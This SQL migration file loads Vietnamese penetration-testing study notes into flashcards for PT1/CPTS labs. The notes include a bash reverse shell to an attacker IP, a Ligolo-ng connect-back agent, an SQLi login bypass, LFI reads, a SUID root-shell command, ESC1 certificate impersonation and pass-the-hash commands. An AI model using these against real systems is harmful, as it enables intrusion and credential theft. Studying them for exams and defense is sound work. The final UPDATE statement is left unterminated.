-- 0043_comprehensive_lab_and_assignment_reference_notes.sql
-- Nâng cấp toàn diện tài liệu ôn tập của các bài Lab và Assignment theo chuẩn đào tạo chuyên sâu:
-- Giải thích tường tận: Khái niệm là gì? Tại sao có phương pháp này? Công cụ là gì, hoạt động ra sao? Chi tiết từng cờ/tham số.

-- ============================================================================
-- LAB 1 — Linux Basics
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Linux cơ bản trong Penetration Testing (PT1 & CPTS)

### 1. Tại sao Pentester bắt buộc phải thành thạo dòng lệnh Linux?
Khi khai thác thành công một máy chủ (thông qua webshell, lỗ hổng RCE hoặc SSH), hơn 80% máy chủ trên Internet và trong phòng lab thi cử là Linux. Tại thời điểm này, bạn **hoàn toàn không có giao diện đồ họa (GUI)** mà chỉ tương tác qua cửa sổ dòng lệnh đen trắng. Việc gõ lệnh nhanh, hiểu quyền hạn (`permissions`) và biết tìm kiếm dữ liệu nhạy cảm là kỹ năng phản xạ sống còn trước khi nghĩ đến việc leo quyền.

### 2. Các công cụ & lệnh tích hợp cốt lõi
* **`ls` (List Directory Contents):** Liệt kê thư mục.
  * *Tại sao cần `-la`?* Bình thường `ls` sẽ ẩn các tệp tin cấu hình nhạy cảm. Thêm cờ `-a` để thấy toàn bộ các file ẩn (bắt đầu bằng dấu chấm `.`, ví dụ: `.bash_history` lưu lại lịch sử lệnh của admin, `.ssh` chứa khóa bí mật, `.env` chứa mật khẩu). Cờ `-l` (long format) cho biết ai sở hữu file và quyền đọc/ghi.
* **`cat` / `less` / `tail` / `head`:** Đọc nội dung tệp tin.
  * Tệp `/etc/passwd`: Là "danh bạ" toàn bộ tài khoản người dùng trên hệ thống Linux. Pentester luôn đọc file này đầu tiên để biết máy có những user nào, thư mục home ở đâu và shell mặc định là gì.
* **`find` (Bộ máy tìm kiếm của Linux):**
  * *Tại sao dùng?* Khi xâm nhập vào máy nạn nhân có hàng trăm ngàn tệp tin, bạn không thể duyệt thủ công từng thư mục.
  * Cú pháp: `find / -iname "*config*" 2>/dev/null`
  * `-iname`: Tìm không phân biệt chữ hoa/thường (`config.php`, `Config.inc`, `CONFIG.bak` đều tìm thấy).
  * `2>/dev/null`: Điều hướng luồng lỗi (Standard Error - descriptor 2) vào "hố đen" `/dev/null` để màn hình không bị tràn ngập hàng ngàn dòng cảnh báo "Permission denied" khi user thường không có quyền vào thư mục hệ thống.
* **`grep` (Global Regular Expression Print):**
  * *Là gì?* Công cụ lọc và tìm kiếm chuỗi văn bản cực mạnh trong các tệp tin.
  * Cú pháp: `grep -ri "password" *.txt` (Cờ `-r` duyệt đệ quy vào các thư mục con, cờ `-i` bỏ qua phân biệt hoa/thường).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 1 — Làm quen lệnh Linux cơ bản';

-- ============================================================================
-- LAB 2 — Nmap Port Scanning & Host Discovery
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Nmap: Recon theo tầng & Phân tích cờ lệnh (PT1 / CPTS)

### 1. Nmap là gì? Tại sao phải quét cổng (Port Scanning)?
* **Nmap (Network Mapper)** là công cụ dò quét mạng và kiểm toán an ninh mạng số 1 thế giới. 
* **Tại sao phải quét cổng?** Mỗi máy chủ cung cấp các dịch vụ qua các "cánh cổng" (port) từ 1 đến 65535. Nếu bạn không biết cổng nào đang mở (`open`), bạn sẽ không biết mục tiêu đang chạy web, máy chủ file (SMB/FTP) hay dịch vụ cơ sở dữ liệu. Bỏ sót một cổng đổi số (ví dụ SSH chạy cổng 2222 thay vì 22) đồng nghĩa với việc bạn bỏ sót hoàn toàn điểm xâm nhập vào hệ thống.

### 2. Quy trình quét 3 tầng chuẩn CPTS
Trong phòng thi, không bao giờ chạy một lệnh quét duy nhất. Luôn tuân theo 3 tầng:

1. **Tầng 1 — Ping Sweep (`-sn`):**
   * `nmap -sn 10.10.10.0/24`
   * *Bản chất:* Chỉ gửi gói tin ICMP echo / ARP để kiểm tra xem máy nào đang bật (alive). **Không quét bất kỳ cổng nào** (`n` = no port scan), giúp quét cả dải mạng 256 IP chỉ trong vài giây.
2. **Tầng 2 — Quét nhanh toàn bộ 65535 cổng TCP (`-p-`):**
   * `nmap -p- --min-rate=1000 -T4 10.10.10.5 -oA scan_all`
   * Mặc định Nmap chỉ quét top 1000 cổng phổ biến nhất. Dùng `-p-` (tương đương `-p 1-65535`) để không bỏ sót các dịch vụ chạy cổng lạ.
   * Cờ `--min-rate=1000`: Ép Nmap phát đi tối thiểu 1000 gói tin/giây, rút ngắn thời gian quét toàn dải từ 20 phút xuống còn 1-2 phút.
3. **Tầng 3 — Thăm dò sâu dịch vụ (`-sC -sV`):**
   * `nmap -sC -sV -p 22,80,445 10.10.10.5 -oA scan_details`
   * Cờ `-sV` (Version Detection): Gửi các gói thăm dò để lấy chính xác phiên bản phần mềm (VD: `Apache 2.4.49`, `vsftpd 2.3.4`).
   * Cờ `-sC` (Script Scan): Chạy bộ script mặc định (NSE) kiểm tra cấu hình sai (Anonymous FTP, SMB signing, SSL certificate...).
   * Cờ `-oA <name>`: Xuất đồng thời 3 file `.nmap` (đọc text), `.xml` (cho các công cụ khác parse), `.gnmap` (dễ dùng grep lọc IP).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 2 — Host discovery & quét cổng (nmap)';

-- ============================================================================
-- LAB 3 — Web Enumeration (Ffuf, Gobuster, Nikto)
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Web Enumeration: Dò tìm tài nguyên ẩn (WEB1 / PT1)

### 1. Web Enumeration là gì? Tại sao bắt buộc phải làm trước khi exploit?
Trang web hiển thị cho người dùng thông thường chỉ là "bề nổi của tảng băng chìm". Phía sau đó thường có các trang quản trị (`/admin`), các tệp sao lưu do lập trình viên để quên (`config.php.bak`, `backup.zip`), các endpoint API (`/api/v1`), hoặc thư mục mã nguồn lộ lọt (`/.git/`). 
Nếu không dùng công cụ tự động hóa dò tìm danh mục (Directory Brute-force), bạn sẽ không thể tìm thấy các bề mặt tấn công này.

### 2. Các công cụ dò quét & giải thích tham số

#### A. `ffuf` (Fuzz Faster U Fool)
* Viết bằng ngôn ngữ Go, có tốc độ cực nhanh, là công cụ fuzzer chuẩn hiện nay.
* **Cú pháp:** `ffuf -w common.txt -u http://10.10.10.5/FUZZ -e .php,.txt,.bak`
* **`-w <file>`:** Đường dẫn đến tệp danh sách từ khóa (wordlist).
* **`-u <url>`:** URL mục tiêu, trong đó từ khóa `FUZZ` sẽ được thay thế tuần tự bằng từng dòng trong wordlist.
* **`-e .php,.txt`:** Mở rộng phần đuôi file. Với từ `admin`, ffuf sẽ thử cả `admin`, `admin.php`, `admin.txt`.

#### B. `gobuster`
* Chuyên dụng cho brute-force đường dẫn web và tên miền phụ (subdomain).
* **Cú pháp:** `gobuster dir -u http://10.10.10.5 -w common.txt -x php,txt,zip`
* `dir`: Chế độ quét thư mục/tệp tin.
* `-x`: Danh sách extension mở rộng.

#### C. `curl` & `nikto`
* `curl -I http://10.10.10.5`: Cờ `-I` (HEAD request) chỉ lấy Header mà không tải toàn bộ nội dung HTML. Rất nhanh để kiểm tra Web server đang chạy (Nginx/Apache), công nghệ backend qua header `X-Powered-By` (PHP/NodeJS/ASP.NET).
* `nikto -h 10.10.10.5`: Công cụ quét lỗ hổng cấu hình web tự động (cảnh báo header thiếu bảo mật, file test mặc định của server).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 3 — Web enumeration cơ bản';

-- ============================================================================
-- LAB 4 — SQL Injection
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## SQL Injection: Bản chất & Khai thác với Sqlmap (WEB1 / PT1)

### 1. SQL Injection (SQLi) là gì? Tại sao lại xảy ra?
SQL Injection là lỗ hổng xảy ra khi ứng dụng web nhận dữ liệu đầu vào từ người dùng (input) rồi **ghép thẳng vào chuỗi câu lệnh SQL** để truy vấn cơ sở dữ liệu thay vì sử dụng cơ chế an toàn Parameterized Query (Prepared Statements).
Kẻ tấn công có thể chèn các ký tự đặc biệt (`''`, `--`, `#`) để bẻ gãy cú pháp câu lệnh SQL gốc của nhà phát triển, biến câu truy vấn thành một lệnh hoàn toàn mới để vượt qua đăng nhập, đọc trộm dữ liệu, hoặc thậm chí ghi webshell lên máy chủ.

### 2. Các phương pháp khai thác thủ công
* **Vượt qua đăng nhập (Login Bypass):**
  * `admin''''--` : Ký tự `''''` đóng chuỗi username, còn `--` sẽ biến toàn bộ phần kiểm tra mật khẩu `AND password = ''''...''''` phía sau thành ghi chú (comment) bị bỏ qua. Kết quả: Đăng nhập thẳng vào tài khoản admin mà không cần biết mật khẩu.
* **Union-based SQLi:** Dùng từ khóa `UNION SELECT` để gộp kết quả truy vấn của kẻ tấn công vào kết quả hiển thị trên màn hình.

### 3. Công cụ tự động hóa `sqlmap`
Sqlmap là công cụ mã nguồn mở tự động phát hiện và khai thác toàn diện các lỗ hổng SQLi.

| Tham số của Sqlmap | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| **`-u <url>`** | Địa chỉ URL mục tiêu (dùng khi tham số truyền qua phương thức GET trong query string). |
| **`--data="..."`** | Chuyển sang phương thức **HTTP POST** (dùng khi kiểm thử form đăng nhập, form tìm kiếm). |
| **`--batch`** | Chạy chế độ tự động hoàn toàn, tự chọn phương án mặc định cho mọi câu hỏi (rất quan trọng khi thi). |
| **`--dbs`** | Liệt kê danh sách tất cả các cơ sở dữ liệu (Databases) trên hệ thống quản trị DBMS. |
| **`-D <db> --tables`** | Chọn cơ sở dữ liệu cụ thể (`-D`) và liệt kê tất cả các bảng (`--tables`) bên trong. |
| **`-D <db> -T <table> --dump`** | Trích xuất (Dump) toàn bộ dữ liệu bảng đó về máy attacker để lấy mật khẩu/hash. |'::text), true)
WHERE kind = 'lab' AND front = 'Lab 4 — SQL Injection (manual + sqlmap)';

-- ============================================================================
-- LAB 5 — LFI & Command Injection
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## LFI & Command Injection: Khái niệm & Kỹ thuật khai thác (WEB1)

### 1. Local File Inclusion (LFI) là gì?
LFI xảy ra khi ứng dụng web sử dụng các hàm nạp tệp (như `include()`, `require()` trong PHP) với tham số do người dùng kiểm soát mà không lọc cẩn thận.
* **Path Traversal (Duyệt thư mục):** Kẻ tấn công dùng các chuỗi `../` (lùi lên thư mục cha) để thoát khỏi thư mục gốc của trang web (`/var/www/html`) và đọc trộm các tệp tin hệ thống như `/etc/passwd` hoặc tệp cấu hình chứa mật khẩu database `config.php`.
* **PHP Stream Filter (`php://filter`):**
  * *Vấn đề:* Nếu include trực tiếp file `config.php`, mã PHP bên trong sẽ bị thực thi thay vì hiển thị ra màn hình.
  * *Giải pháp:* Dùng wrapper `php://filter/convert.base64-encode/resource=config.php` để yêu cầu PHP mã hóa nội dung file sang Base64 trước khi nạp, giúp kẻ tấn công đọc được toàn bộ mã nguồn bí mật.

### 2. Command Injection là gì?
Command Injection xảy ra khi ứng dụng web gọi các lệnh shell của hệ điều hành (thông qua các hàm như `system()`, `exec()`, `passthru()` trong PHP) với dữ liệu chưa được làm sạch.
* **Toán tử nối lệnh:**
  * `;` : Ngăn cách hai lệnh độc lập (lệnh 2 luôn chạy bất kể lệnh 1 đúng hay sai).
  * `&&` : Chỉ chạy lệnh thứ hai nếu lệnh thứ nhất trả về mã thành công (exit code = 0).
  * `|` (Pipe) : Chuyển output của lệnh 1 làm input cho lệnh 2.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 5 — LFI & Command Injection';

-- ============================================================================
-- LAB 6 — Reverse Shell & Nâng cấp TTY
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Reverse Shell & Nâng cấp TTY: Bản chất & Công cụ Netcat (PT1 / CPTS)

### 1. Reverse Shell là gì? Tại sao lại có phương pháp này?
* **Khái niệm:** Trong thế giới mạng, có 2 cách để lấy quyền điều khiển dòng lệnh từ xa:
  * **Bind Shell:** Mục tiêu mở một cổng lắng nghe (VD: mở cổng 4444), máy Attacker sẽ chủ động kết nối vào cổng đó.
  * **Reverse Shell (Shell ngược):** Máy Attacker mở cổng lắng nghe trước, sau đó kích hoạt máy Mục tiêu chủ động kết nối ngược ra ngoài về địa chỉ IP của Attacker.
* **Tại sao hầu hết Pentester luôn dùng Reverse Shell?**
  * Trong môi trường thực tế, **Tường lửa (Firewall) và cơ chế NAT luôn chặn các kết nối đi vào (Inbound)**. Nếu bạn mở Bind Shell trên máy mục tiêu, tường lửa sẽ chặn không cho máy Attacker kết nối vào.
  * Ngược lại, các tường lửa thường **cho phép các kết nối đi ra ngoài (Outbound)** để máy chủ tải bản cập nhật hoặc duyệt web. Do đó, ép máy mục tiêu chủ động gọi ngược ra ngoài (Reverse Shell) là kỹ thuật kinh điển nhất để vượt qua tường lửa.

### 2. Netcat là gì? Có thể làm gì?
* **Netcat (`nc`)** được mệnh danh là "con dao pha Thụy Sĩ" (Swiss Army Knife) của mạng máy tính. Nó là một công cụ dòng lệnh cực kỳ nhỏ gọn nhưng mạnh mẽ, cho phép đọc và ghi dữ liệu qua các kết nối mạng sử dụng giao thức TCP hoặc UDP.
* **Netcat làm được những gì?**
  * Mở cổng lắng nghe để chờ kết nối (Listener cho Reverse Shell).
  * Kết nối tới một dịch vụ bất kỳ để kiểm tra cổng mở hoặc lấy banner (Banner Grabbing).
  * Truyền tệp tin giữa hai máy tính qua mạng mà không cần cài đặt FTP hay SMB.
  * Quét cổng cơ bản khi không có sẵn Nmap.

### 3. Giải thích chi tiết các cờ lệnh Netcat
* **Lệnh mở listener:** `nc -nvlp 4444`
  * **`-l` (Listen):** Bật chế độ lắng nghe, biến Netcat thành máy chủ chờ kết nối đến (thay vì kết nối ra ngoài).
  * **`-v` (Verbose):** Hiển thị thông tin chi tiết trên màn hình (thông báo ngay khi có máy kết nối đến).
  * **`-n` (Numeric only):** Tắt tính năng phân giải tên miền DNS. Giúp Netcat không tốn thời gian tra cứu tên máy của kết nối đến, bắt shell tức thì và không để lại dấu vết DNS log.
  * **`-p 4444` (Port):** Chỉ định số cổng mà Netcat sẽ mở lắng nghe.

### 4. Giải thích cơ chế lệnh Bash Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```
* `bash -i`: Khởi chạy một shell Bash ở chế độ tương tác (interactive).
* `/dev/tcp/10.10.14.1/4444`: Tính năng nội tại của Bash, tự động mở một kết nối socket TCP tới IP và cổng tương ứng mà không cần cài thêm công cụ gì.
* `>&`: Hợp nhất cả hai luồng dữ liệu xuất chuẩn (stdout - 1) và thông báo lỗi (stderr - 2) vào socket TCP.
* `0>&1`: Chuyển hướng luồng dữ liệu nhập chuẩn (stdin - 0) lấy trực tiếp từ socket TCP (nghĩa là lệnh do attacker gõ trên máy mình sẽ đi thẳng vào máy victim).

### 5. Tại sao phải nâng cấp TTY (`stty raw -echo`)?
Shell ban đầu thu được từ reverse shell là một shell "thô" (dumb shell/pipe shell). Nếu bạn vô tình nhấn `Ctrl+C`, shell sẽ bị ngắt kết nối ngay lập tức; phím `Tab` không thể tự hoàn thành tên file; và bạn không thể mở trình soạn thảo như `nano` hay `vim`.
* `python3 -c "import pty; pty.spawn(''/bin/bash'')"`: Dùng thư viện Python để tạo một pseudo-terminal (pty) thật sự.
* `Ctrl+Z`: Tạm thời đưa kết nối về chế độ chạy ngầm trên máy Attacker.
* `stty raw -echo`: Lệnh gõ trên máy Attacker. `raw` yêu cầu terminal máy mình chuyển trực tiếp toàn bộ phím bấm (bao gồm cả Ctrl+C và Tab) sang cho shell của victim; `-echo` tắt việc in lặp lại ký tự để giao diện không bị loạn. Sau đó gõ `fg` để đưa shell trở lại hoạt động bình thường.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 6 — Reverse shell & nâng cấp TTY';

-- ============================================================================
-- LAB 7 — Linux Privilege Escalation
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Linux Privilege Escalation: Leo quyền cục bộ (PT1 / CPTS)

### 1. Privilege Escalation (PrivEsc) là gì?
Khi bạn xâm nhập thành công vào máy chủ thông qua một lỗ hổng web, shell bạn nhận được thường là một tài khoản bị giới hạn quyền nghiêm ngặt (như `www-data`, `apache` hoặc tài khoản dịch vụ). 
**Leo quyền (Privilege Escalation)** là quá trình tìm kiếm các lỗ hổng phần mềm hoặc cấu hình sai trong hệ điều hành để nâng từ tài khoản thấp quyền này lên quyền quản trị tối cao: **`root`** (UID 0).

### 2. Các vector leo quyền kinh điển

#### A. Quyền Sudo không cần mật khẩu (`sudo -l`)
* Trong Linux, file `/etc/sudoers` quy định người dùng nào được phép chạy lệnh gì với quyền root.
* Lệnh `sudo -l` giúp kiểm tra tài khoản hiện tại có được cấp quyền chạy đặc biệt nào không.
* Nếu thấy dòng: `(ALL) NOPASSWD: /usr/bin/python3`, nghĩa là bạn có thể chạy python với quyền root mà không cần hỏi mật khẩu.
* **GTFOBins là gì?** Là một kho lưu trữ trực tuyến liệt kê toàn bộ các chương trình nhị phân hợp pháp của Linux có thể bị lạm dụng để mở shell hoặc đọc/ghi tệp tin khi được cấp quyền Sudo hoặc SUID.

#### B. SUID Bit (Set User ID)
* Lệnh tìm kiếm: `find / -perm -4000 2>/dev/null`
* **Cơ chế:** Thông thường khi bạn chạy một file, nó chạy dưới quyền của bạn. Nhưng nếu file có gắn cờ SUID bit (octal `4000`), hệ điều hành sẽ cho phép file đó **chạy dưới quyền của chủ sở hữu tệp (Owner - thường là root)**.
* Khai thác với `/usr/bin/find`:
  * `find . -exec /bin/sh -p \;`
  * Cờ `-p` (**privileged**) của `/bin/sh` là chìa khóa: nó ép shell không được tự ý hạ quyền xuống tài khoản thường mà phải giữ nguyên quyền root thực tế (Effective UID = 0).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 7 — Linux Privilege Escalation';

-- ============================================================================
-- LAB 8 — Active Directory Enumeration
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Active Directory Enumeration: Lập bản đồ miền (CPTS)

### 1. Active Directory (AD) là gì?
Active Directory là giải pháp quản trị mạng tập trung của Microsoft, được hơn 90% các tập đoàn lớn sử dụng. Toàn bộ máy tính (Workstations), máy chủ (Domain Controllers), người dùng (Users) và chính sách bảo mật (Group Policy) đều được quản lý tập trung tại đây. Trong kỳ thi HTB CPTS, Active Directory chiếm tỷ trọng điểm số lớn nhất.

### 2. Các công cụ rà soát cốt lõi

* **`smbclient`:**
  * Dùng để kiểm tra các thư mục chia sẻ qua giao thức SMB (cổng 445).
  * `smbclient -L //10.10.10.100 -N`: Cờ `-N` (No password / Null session) kiểm tra xem Domain Controller có cho phép người lạ xem danh sách thư mục mà không cần mật khẩu hay không.
* **`kerbrute`:**
  * *Là gì?* Công cụ dò tìm tài khoản Active Directory tốc độ cao viết bằng Go.
  * *Tại sao dùng Kerbrute thay vì brute-force mật khẩu?* 
    Các tổ chức thường có chính sách khóa tài khoản (Account Lockout Policy) nếu nhập sai mật khẩu 3-5 lần. Kerbrute sử dụng cơ chế **Kerberos Pre-Authentication**: nó chỉ gửi yêu cầu hỏi "tài khoản này có tồn tại để xin vé Kerberos không?". DC sẽ trả lời ngay tài khoản có thật hay không **mà không hề kiểm tra mật khẩu**, do đó **hoàn toàn không bao giờ làm khóa tài khoản**.
* **`bloodhound-python`:**
  * Thu thập toàn bộ dữ liệu quan hệ trong domain (Ai thuộc nhóm nào? User nào có quyền quản trị máy nào?) rồi xuất ra các file JSON để nạp vào giao diện đồ họa **BloodHound GUI** (chạy trên cơ sở dữ liệu đồ thị Neo4j) để tự động vẽ ra con đường ngắn nhất dẫn đến Domain Admin.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 8 — Active Directory enumeration';

-- ============================================================================
-- LAB 18 — Pivoting với Ligolo-ng & SMB
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Pivoting hiện đại với Ligolo-ng & Chuyển file SMB (CPTS)

### 1. Pivoting (Bắc cầu mạng) là gì? Tại sao bắt buộc phải dùng trong CPTS?
Trong một mạng doanh nghiệp thực tế hoặc đề thi CPTS, các máy chủ quan trọng nhất (như Domain Controller, máy chủ kế toán, máy chủ nội bộ) **hoàn toàn không kết nối trực tiếp với Internet**. Chúng nằm sau tường lửa trong các dải mạng riêng (VD: `172.16.50.0/24`). 
Máy tấn công của bạn chỉ có thể truy cập được một máy chủ công khai (DMZ host). **Pivoting** là kỹ thuật biến máy chủ bị chiếm đầu tiên đó thành một "cầu nối" (bàn đạp - pivot point) để định tuyến toàn bộ lưu lượng tấn công từ máy Kali xuyên sâu vào mạng nội bộ bên trong.

### 2. Ligolo-ng là gì? Tại sao vượt trội hơn Chisel + Proxychains?
* Trước đây, phương pháp truyền thống là dùng `chisel` mở SOCKS proxy rồi dùng `proxychains` để chạy lệnh. Nhược điểm lớn: Rất chậm, dễ bị nghẽn gói tin, và các công cụ phức tạp như Nmap, Impacket, Certipy thường xuyên bị lỗi khi chạy qua Proxychains.
* **Ligolo-ng** là công cụ tunneling thế hệ mới hoạt động ở **Tầng Mạng (Layer 3)** bằng cách tạo một virtual **TUN interface** thật sự trên máy Kali.
* **Ưu điểm vượt trội:** Khi đã tạo route vào TUN interface của Ligolo-ng, bạn có thể chạy trực tiếp mọi lệnh `nmap -sC -sV`, `ping`, `certipy`, `netexec` tới IP nội bộ mượt mà y hệt như đang cắm trực tiếp dây mạng vào switch nội bộ của nạn nhân.

### 3. Quy trình 4 bước thiết lập Ligolo-ng
```bash
# Bước 1 (Attacker): Tạo và kích hoạt TUN interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Bước 2 (Attacker): Chạy máy chủ proxy lắng nghe kết nối
./proxy -selfcert -laddr 0.0.0.0:11601

# Bước 3 (Pivot Host): Chạy agent kết nối ngược về Kali
./agent -connect 10.10.14.5:11601 -ignore-cert

# Bước 4 (Attacker): Thêm định tuyến cho dải mạng nội bộ vào TUN
sudo ip route add 172.16.50.0/24 dev ligolo
```

### 4. Công cụ `impacket-smbserver`
* Khi máy Windows mục tiêu bị chặn tải file qua HTTP, ta có thể mở một SMB share tạm thời trên máy Kali:
  `impacket-smbserver share . -smb2support`
* Cờ `-smb2support` là bắt buộc vì Windows 10/11 đã vô hiệu hóa hoàn toàn giao thức SMBv1 cũ vì lý do bảo mật. Máy Windows nạn nhân chỉ cần gõ `copy \\10.10.14.5\share\tool.exe .` là có thể sao chép file về dễ dàng.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 18 — Pivoting hiện đại với Ligolo-ng & Chuyển file SMB';

-- ============================================================================
-- LAB 19 — ADCS (Certipy), Kerberoasting & Pass-the-Hash
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Active Directory nâng cao: Kerberoasting, ADCS & Pass-the-Hash (CPTS)

### 1. Phân biệt Kerberoasting và AS-REP Roasting (Câu hỏi kinh điển)
* **AS-REP Roasting (`GetNPUsers.py`):** Nhắm vào các tài khoản bị cấu hình sai tắt tính năng *Kerberos Pre-Authentication*. Kỹ thuật này **hoàn toàn không cần mật khẩu trước** (chỉ cần danh sách username hợp lệ). Mode Hashcat: **`-m 18200`**.
* **Kerberoasting (`GetUserSPNs.py`):** Bất kỳ tài khoản domain hợp lệ nào (kể cả user quầy lễ tân) cũng có quyền gửi yêu cầu xin vé dịch vụ TGS (Ticket Granting Service) cho các tài khoản dịch vụ có gắn SPN (Service Principal Name - như SQL, IIS). Vì vé TGS được mã hóa bằng chính NTLM hash của tài khoản dịch vụ đó, kẻ tấn công đem vé này về máy bẻ khóa offline qua Hashcat mode **`-m 13100`**.

### 2. Dịch vụ chứng chỉ ADCS & Lỗ hổng ESC1
* **ADCS (Active Directory Certificate Services)** là dịch vụ cấp phát chứng chỉ số (PKI) của Microsoft trong domain.
* **Lỗ hổng ESC1 là gì?** Xảy ra khi một Certificate Template có cấu hình sai lầm:
  1. Cho phép tài khoản người dùng bình thường được quyền xin cấp chứng chỉ (`Enroll`).
  2. Chứng chỉ này có mục đích xác thực đăng nhập người dùng (`Client Authentication`).
  3. Bật tùy chọn nguy hiểm **`Enrollee Supplies Subject` (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)**: Cho phép người xin chứng chỉ được quyền **tự điền tên người nhận (Subject Alternative Name - SAN)** tùy ý!
* **Hậu quả:** Kẻ tấn công dùng tài khoản user thường xin cấp một chứng chỉ nhưng tự điền tên người sở hữu là `administrator@corp.local`. Sau đó nộp chứng chỉ này cho Domain Controller để đổi lấy vé TGT và NTLM hash của Domain Admin!
* **Công cụ `certipy`:**
  * `certipy find -vulnerable`: Tự động tìm kiếm các mẫu chứng chỉ có lỗi cấu hình (ESC1 - ESC8).
  * `certipy req -ca <CA> -template <Template> -upn administrator@corp.local`: Xin cấp chứng chỉ mạo danh Administrator.
  * `certipy auth -pfx administrator.pfx`: Đổi chứng chỉ lấy hash NTLM qua giao thức Kerberos PKINIT.

### 3. Pass-the-Hash (PTH) là gì?
Trong hệ điều hành Windows, mật khẩu dạng văn bản rõ không được lưu trữ mà được băm thành **NTLM Hash**. Khi xác thực qua các giao thức mạng như SMB hay RPC, Windows chỉ kiểm tra mã băm này.
**Pass-the-Hash** là kỹ thuật cho phép kẻ tấn công sử dụng trực tiếp NTLM hash đã đánh cắp để đăng nhập vào máy chủ khác từ xa mà **hoàn toàn không cần tốn thời gian bẻ khóa ra mật khẩu gốc**.
* Thực hiện qua `netexec`: `nxc smb 10.10.10.100 -u administrator -H <nthash>`
* Thực hiện qua `impacket-psexec`: `impacket-psexec -hashes :<nthash> administrator@10.10.10.100`'::text), true)
WHERE kind = 'lab' AND front = 'Lab 19 — AD nâng cao (CPTS): Kerberoasting, ADCS (Certipy) & Pass-the-Hash';


-- ============================================================================
-- LAB 9 — Password Attacks
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Password Attacks: Online Brute-force & Offline Hash Cracking (PT1 / CPTS)

### 1. Phân biệt Tấn công trực tuyến (Online) và Ngoại tuyến (Offline)
* **Online Attack (Trực tuyến):** Gửi từng cặp username/mật khẩu qua mạng tới dịch vụ thật (SSH, FTP, Web form) bằng công cụ như `hydra`. Nhược điểm: Chậm (giới hạn bởi độ trễ mạng) và dễ bị phát hiện bởi hệ thống ghi log hoặc bị chặn bởi chính sách khóa tài khoản (Account Lockout).
* **Offline Attack (Ngoại tuyến):** Sau khi đã đánh cắp được file băm mật khẩu (file hash từ database hoặc SAM/NTDS.dit), kẻ tấn công đem file này về máy cá nhân của mình và dùng sức mạnh của GPU/CPU chạy `hashcat` hoặc `john` để thử hàng tỷ mật khẩu mỗi giây. Ưu điểm: Tốc độ cực nhanh và máy chủ nạn nhân **hoàn toàn không hề hay biết**.

### 2. Công cụ `hydra`
* `hydra -l admin -P passwords.txt ssh://10.10.10.5`
* **Quy ước cờ hoa/thường:**
  * `-l`: Chỉ định 1 username cố định.
  * `-L`: Nạp danh sách nhiều username từ file.
  * `-p`: Chỉ định 1 mật khẩu cố định.
  * `-P`: Nạp danh sách wordlist mật khẩu (như `rockyou.txt`).

### 3. Công cụ `hashcat`
* Hashcat là bộ bẻ khóa mật khẩu tận dụng sức mạnh card đồ họa (GPU) nhanh nhất thế giới.
* **Cú pháp:** `hashcat -m <mode> <hashfile> <wordlist>`
* **Bảng mode Hashcat quan trọng nhất:**
  * `-m 0`: MD5
  * `-m 1000`: NTLM (SAM, NTDS.dit) — **dùng được cho Pass-the-Hash**
  * `-m 5600`: NetNTLMv2 (bắt qua mạng bằng Responder) — **không Pass-the-Hash được**
  * `-m 13100`: Kerberoasting (vé TGS-REP)
  * `-m 18200`: AS-REP Roasting'::text), true)
WHERE kind = 'lab' AND front = 'Lab 9 — Password attacks (hydra / hashcat / john)';

-- ============================================================================
-- LAB 10 — Tmux
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Quản trị Terminal đa nhiệm với Tmux (PT1 / CPTS)

### 1. Tmux là gì? Tại sao bắt buộc phải dùng trong thực chiến?
* **Tmux (Terminal Multiplexer)** là công cụ chia màn hình và duy trì phiên làm việc cho terminal trên Linux.
* **Vấn đề thực tế:** Khi thi thực hành (24h với PT1 hoặc 10 ngày với CPTS), bạn kết nối tới lab qua VPN. Nếu mạng Wi-Fi bị ngắt kết nối SSH giữa lúc bạn đang chạy quét Nmap toàn dải cổng hoặc đang lắng nghe reverse shell, tiến trình đó sẽ **bị hệ điều hành tắt ngay lập tức**.
* **Giải pháp của Tmux:** Một session trong Tmux chạy độc lập hoàn toàn với phiên đăng nhập SSH. Dù bạn bị rớt mạng hay tắt máy tính, toàn bộ tiến trình bên trong vẫn tiếp tục chạy ngầm trên máy chủ. Khi có mạng trở lại, bạn chỉ cần gõ `tmux attach` là quay lại đúng màn hình cũ mà không mất bất kỳ dữ liệu nào.

### 2. Bảng phím tắt cốt lõi (Prefix: `Ctrl+B`)
* `Ctrl+B` rồi `"` : Chia đôi cửa sổ theo chiều **Ngang** (pane mới ở dưới).
* `Ctrl+B` rồi `%` : Chia đôi cửa sổ theo chiều **Dọc** (pane mới ở bên phải).
* `Ctrl+B` rồi phím mũi tên: Di chuyển con trỏ giữa các pane.
* `Ctrl+B` rồi `Z` : Phóng to (Zoom) pane hiện tại toàn màn hình để đọc log dài, bấm lại để thu nhỏ.
* `Ctrl+B` rồi `C` : Tạo một tab mới (Window).
* `Ctrl+B` rồi `N` / `P` : Chuyển qua Tab kế tiếp (`next`) hoặc Tab trước (`prev`).
